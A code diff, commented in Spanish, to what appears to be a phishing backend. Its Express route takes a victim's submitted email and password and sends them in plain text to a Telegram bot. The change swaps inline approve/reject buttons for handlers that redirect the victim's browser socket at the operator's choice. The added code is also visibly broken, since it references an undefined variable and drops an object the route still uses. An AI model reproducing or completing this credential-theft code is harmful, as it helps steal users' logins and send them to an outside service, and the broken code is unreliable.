@@ -42,14 +42,21 @@ app.post('/enviar', async (req, res) => {
 
   const mensaje = `🔐 Nuevo intento de acceso:\n📧 Correo: ${usuario}\n🔑 Contraseña: ${contrasena}`;
 
-  const opciones = {
-    reply_markup: {
-      inline_keyboard: [
-        [{ text: '✅ Aceptar', callback_data: 'aceptar' }],
-        [{ text: '❌ Rechazar', callback_data: 'rechazar' }]
-      ]
-    }
-  };
+ // Esto depende de cómo manejás los botones, pero algo así:
+if (data === 'approve') {
+  console.log('✅ Acceso aprobado!');
+  if (currentSocket) {
+    currentSocket.emit('redirect', '/bienvenido.html'); // URL que quieras
+  }
+}
+
+if (data === 'reject') {
+  console.log('❌ Acceso rechazado!');
+  if (currentSocket) {
+    currentSocket.emit('redirect', '/denegado.html'); // Otra URL
+  }
+}
+
 
   await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
     method: 'POST',
